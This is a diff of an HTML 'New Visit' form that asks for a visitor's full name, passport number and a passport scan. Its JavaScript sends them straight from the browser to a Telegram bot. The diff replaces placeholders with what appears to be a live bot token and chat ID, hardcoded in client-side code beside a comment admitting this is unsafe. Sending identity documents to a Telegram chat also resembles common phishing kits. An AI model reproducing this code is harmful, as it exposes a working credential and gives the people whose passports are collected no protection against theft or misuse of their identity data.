@@ -1,198 +1,168 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>زيارة جديدة</title>
+  <title>New Visit</title>
   <style>
-    :root {
-      --main-bg: #f7f9fc;
-      --card-bg: #ffffff;
-      --border: #e0e4ec;
-      --text-main: #222;
-      --text-sub: #555;
-      --primary: #0078ff;
-      --primary-light: #e8f2ff;
+    :root{
+      --glass-bg: rgba(255,255,255,0.12);
+      --glass-bg-hover: rgba(255,255,255,0.22);
+      --danger: #ff5252;
+      --ok: #22c55e;
     }
-
-    * { box-sizing: border-box; }
-
+    *{box-sizing:border-box}
     body {
-      font-family: "Cairo", system-ui, sans-serif;
-      background: var(--main-bg);
-      color: var(--text-main);
+      min-height: 100vh;
       display: flex;
       flex-direction: column;
+      justify-content: center;
       align-items: center;
-      padding: 30px 20px;
-      min-height: 100vh;
+      font-family: "Poppins", system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, sans-serif;
+      background: linear-gradient(135deg, #007aff, #00c6ff);
+      margin: 0;
+      color: #fff;
+      padding: 20px;
     }
 
     h1 {
-      font-size: 2rem;
+      font-size: 2.4rem;
       font-weight: 700;
-      margin-bottom: 10px;
-      text-align: center;
-      color: var(--primary);
+      margin: 0 0 18px;
+      text-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      animation: fadeInDown 0.8s ease;
+      text-align:center;
     }
 
-    p.subtitle {
-      color: var(--text-sub);
-      text-align: center;
-      margin-bottom: 25px;
-      line-height: 1.6;
+    p.subtitle{
+      opacity:.9; margin-top:0; margin-bottom:28px; text-align:center
     }
 
-    form {
-      background: var(--card-bg);
-      border: 1px solid var(--border);
-      border-radius: 16px;
-      padding: 28px 22px;
+    form{
       width: 100%;
-      max-width: 420px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+      max-width: 560px;
+      background: rgba(255,255,255,0.12);
+      border: 1px solid rgba(255,255,255,0.25);
+      border-radius: 18px;
+      padding: 22px;
+      backdrop-filter: blur(10px);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+      animation: fadeInUp 0.9s ease;
     }
 
-    label {
-      font-weight: 600;
-      margin-bottom: 6px;
-      display: block;
+    /* Hide visual labels, keep for accessibility */
+    .visually-hidden {
+      position: absolute !important;
+      height: 1px; width: 1px;
+      overflow: hidden;
+      clip: rect(1px, 1px, 1px, 1px);
+      white-space: nowrap;
     }
 
-    .req {
-      color: var(--primary);
-    }
-
-    input[type="text"],
-    input[type="tel"],
-    input[type="file"] {
+    input[type="text"], input[type="tel"], input[type="file"]{
       width: 100%;
-      padding: 12px 14px;
-      border-radius: 10px;
-      border: 1px solid var(--border);
+      padding: 14px 16px;
+      border-radius: 14px;
+      background: rgba(255,255,255,0.15);
+      color: #fff;
+      border: 1px solid rgba(255,255,255,0.28);
       outline: none;
-      font-size: 1rem;
-      background: var(--primary-light);
-      transition: all 0.2s ease;
+      transition: all .25s ease;
     }
 
-    input:focus {
-      border-color: var(--primary);
-      background: #fff;
-      box-shadow: 0 0 0 3px rgba(0,120,255,0.1);
+    input::file-selector-button{
+      padding: 10px 16px; border: none; border-radius: 12px; background: rgba(0,0,0,.25); color:#fff; margin-inline-end: 12px; cursor:pointer
     }
 
-    input::file-selector-button {
-      padding: 8px 14px;
-      background: var(--primary);
-      color: #fff;
-      border: none;
-      border-radius: 8px;
-      margin-inline-end: 10px;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
+    input:focus{ box-shadow: 0 0 0 3px rgba(255,255,255,0.25); }
 
-    input::file-selector-button:hover {
-      background: #005ec4;
-    }
+    .row{ display:grid; grid-template-columns: 1fr; gap:14px }
+    @media(min-width:640px){ .row{ grid-template-columns: 1fr 1fr } }
 
-    .help, .note {
-      font-size: 0.9rem;
-      color: var(--text-sub);
-      margin-top: 6px;
-    }
+    .help{font-size:.9rem; opacity:.85; margin: 6px 6px 0}
+    .error{ color: var(--danger); margin: 6px 6px 0; display:none }
 
-    .error {
-      color: #d72638;
-      font-size: 0.9rem;
-      display: none;
-      margin-top: 4px;
-    }
-
-    button {
+    button{
       width: 100%;
-      margin-top: 20px;
-      padding: 14px;
-      font-size: 1.05rem;
+      padding: 14px 20px;
+      font-size: 1.1rem;
       border: none;
-      border-radius: 12px;
-      background: var(--primary);
+      border-radius: 14px;
+      background: var(--glass-bg);
       color: #fff;
-      font-weight: 600;
       cursor: pointer;
+      backdrop-filter: blur(10px);
       transition: all 0.25s ease;
+      font-weight: 600;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.22);
+      margin-top: 16px;
     }
 
-    button:hover {
-      background: #005ec4;
-      transform: translateY(-1px);
-    }
-
-    button:disabled {
-      opacity: 0.7;
-      cursor: not-allowed;
-    }
+    button:hover { background: var(--glass-bg-hover); transform: translateY(-1px); }
+    button:disabled{ opacity:.7; cursor:not-allowed }
 
     .toast {
-      position: fixed;
-      bottom: 25px;
-      background: rgba(0,0,0,0.85);
-      color: #fff;
-      padding: 12px 18px;
-      border-radius: 10px;
-      font-size: 0.95rem;
-      opacity: 0;
-      transition: opacity 0.35s ease;
+      position: fixed; inset-inline: 0; bottom: 24px; margin-inline:auto; width: fit-content;
+      padding: 14px 18px; background: rgba(0,0,0,0.78);
+      border-radius: 12px; font-size: 1rem; opacity: 0; transition: opacity 0.35s ease
     }
+    .toast.show { opacity: 1 }
 
-    .toast.show { opacity: 1; }
+    .note{ font-size:.85rem; opacity:.85; margin-top:10px; text-align:center }
 
+    @keyframes fadeInDown { from {opacity: 0; transform: translateY(-16px);} to {opacity: 1; transform: translateY(0);} }
+    @keyframes fadeInUp   { from {opacity: 0; transform: translateY(16px);}  to {opacity: 1; transform: translateY(0);} }
   </style>
 </head>
 <body>
-  <h1>👋 أهلاً بك</h1>
-  <p class="subtitle">يرجى تعبئة البيانات التالية لإرسال إشعار زيارة مع نسخة PDF من جواز السفر.</p>
+  <h1>Welcome</h1>
+  <p class="subtitle">Please complete the details below to send a visit notification with the passport copy.</p>
 
-  <form id="visit-form">
-    <label for="fullName">الاسم الكامل <span class="req">*</span></label>
-    <input id="fullName" name="fullName" type="text" placeholder="مثال: محمد أحمد العلوي" required />
-    <div id="errName" class="error">الرجاء إدخال اسم كامل صالح (٣ أحرف فأكثر).</div>
+  <form id="visit-form" novalidate>
+    <div class="row">
+      <div>
+        <label class="visually-hidden" for="fullName">Full name</label>
+        <input id="fullName" name="fullName" type="text" placeholder="Full name" autocomplete="name" required />
+        <div id="errName" class="error">Please enter a valid full name (at least 3 characters).</div>
+      </div>
+      <div>
+        <label class="visually-hidden" for="passport">Passport number</label>
+        <input id="passport" name="passport" type="text" inputmode="latin" pattern="[A-Za-z0-9]{6,12}" placeholder="Passport number" required />
+        <div class="help">6–12 Latin letters or digits, no spaces</div>
+        <div id="errPass" class="error">Passport number must be 6–12 Latin letters/digits.</div>
+      </div>
+    </div>
 
-    <label for="passport">رقم جواز السفر <span class="req">*</span></label>
-    <input id="passport" name="passport" type="text" pattern="[A-Za-z0-9]{6,12}" placeholder="مثال: X1234567" required />
-    <div class="help">٦–١٢ حرف/رقم لاتيني بدون مسافات</div>
-    <div id="errPass" class="error">رقم الجواز يجب أن يكون ٦–١٢ رموز لاتينية/أرقام.</div>
+    <label class="visually-hidden" for="doc">Upload passport (PDF or image)</label>
+    <input id="doc" name="doc" type="file" accept="application/pdf,image/*" required />
+    <div class="help">Max size 20MB. PDF or common image formats are allowed.</div>
+    <div id="errFile" class="error">File must be a PDF or an image within the size limit.</div>
 
-    <label for="pdf">رفع ملف الجواز (PDF فقط) <span class="req">*</span></label>
-    <input id="pdf" name="pdf" type="file" accept="application/pdf" required />
-    <div class="help">الحد الأقصى المقترح 20MB.</div>
-    <div id="errFile" class="error">الملف يجب أن يكون PDF وبحجم مناسب.</div>
-
-    <button id="sendBtn" type="submit">📨 إرسال</button>
-    <div class="note">بالضغط على "إرسال" سيتم إرسال البيانات والملف إلى بوت تيليجرام المحدد.</div>
+    <button id="sendBtn" type="submit">Send</button>
+    <div class="note">By clicking “Send”, the data and file will be sent to the configured Telegram bot.</div>
   </form>
 
   <div id="toast" class="toast"></div>
 
   <script>
-    const BOT_TOKEN = "YOUR_BOT_TOKEN";
-    const CHAT_ID   = "YOUR_CHAT_ID";
+    // Security note: Exposing a bot token in the frontend is unsafe. Prefer a secure backend proxy.
+    const BOT_TOKEN = "7544882164:AAHUQCd3fnHSwbj6tSPIGSEbRgkOXS3wLTY";
+    const CHAT_ID   = "6494466799";
 
-    const form   = document.getElementById("visit-form");
-    const toast  = document.getElementById("toast");
-    const sendBtn= document.getElementById("sendBtn");
+    const form    = document.getElementById("visit-form");
+    const toast   = document.getElementById("toast");
+    const sendBtn = document.getElementById("sendBtn");
 
     function showToast(message){
       toast.textContent = message;
       toast.classList.add("show");
-      setTimeout(() => toast.classList.remove("show"), 3000);
+      setTimeout(() => toast.classList.remove("show"), 3200);
     }
 
     function validate(){
       const name = document.getElementById('fullName');
       const pass = document.getElementById('passport');
-      const file = document.getElementById('pdf');
+      const file = document.getElementById('doc');
 
       const okName = (name.value || '').trim().length >= 3;
       document.getElementById('errName').style.display = okName ? 'none' : 'block';
@@ -202,7 +172,9 @@
       document.getElementById('errPass').style.display = okPass ? 'none' : 'block';
 
       const f = file.files[0];
-      const okFile = !!f && f.type === 'application/pdf' && f.size <= 20 * 1024 * 1024;
+      const isPdf = f && f.type === 'application/pdf';
+      const isImg = f && f.type.startsWith('image/');
+      const okFile = !!f && (isPdf || isImg) && f.size <= 20 * 1024 * 1024;
       document.getElementById('errFile').style.display = okFile ? 'none' : 'block';
 
       return okName && okPass && okFile;
@@ -210,11 +182,13 @@
 
     async function sendMessage(text){
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      await fetch(url, {
+      const res = await fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: CHAT_ID, text })
       });
+      if(!res.ok) throw new Error('sendMessage failed');
+      return res.json();
     }
 
     async function sendDocument(file, caption){
@@ -222,32 +196,35 @@
       const fd = new FormData();
       fd.append('chat_id', CHAT_ID);
       fd.append('document', file);
-      fd.append('caption', caption);
-      await fetch(url, { method: 'POST', body: fd });
+      if (caption) fd.append('caption', caption);
+      const res = await fetch(url, { method: 'POST', body: fd });
+      if(!res.ok) throw new Error('sendDocument failed');
+      return res.json();
     }
 
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      if(!validate()) { showToast('⚠️ تحقق من المدخلات ثم أعد المحاولة'); return; }
+      if(!validate()) { showToast('Please check the inputs and try again.'); return; }
 
       const name = document.getElementById('fullName').value.trim();
       const pass = document.getElementById('passport').value.trim();
-      const file = document.getElementById('pdf').files[0];
+      const file = document.getElementById('doc').files[0];
 
-      const timeStr = new Date().toLocaleString('ar-EG');
-      const header  = `🔔 زيارة جديدة\n⌚️ ${timeStr}`;
-      const details = `👤 الاسم: ${name}\n🛂 رقم الجواز: ${pass}`;
+      const timeStr = new Date().toLocaleString('en-GB');
+      const header  = `New site visit\n${timeStr}`;
+      const details = `Name: ${name}\nPassport No.: ${pass}`;
 
       try {
-        sendBtn.disabled = true; sendBtn.textContent = 'جارٍ الإرسال...';
+        sendBtn.disabled = true; sendBtn.textContent = 'Sending...';
         await sendMessage(`${header}\n\n${details}`);
-        await sendDocument(file, `📎 جواز السفر\n${details}`);
-        showToast('✅ تم إرسال البيانات بنجاح');
+        await sendDocument(file, `Passport document\n${details}`);
+        showToast('Submitted successfully.');
         form.reset();
       } catch(err){
-        showToast('❌ حدث خطأ أثناء الإرسال');
+        console.error(err);
+        showToast('Submission failed. Please try again later.');
       } finally {
-        sendBtn.disabled = false; sendBtn.textContent = '📨 إرسال';
+        sendBtn.disabled = false; sendBtn.textContent = 'Send';
       }
     });
   </script>
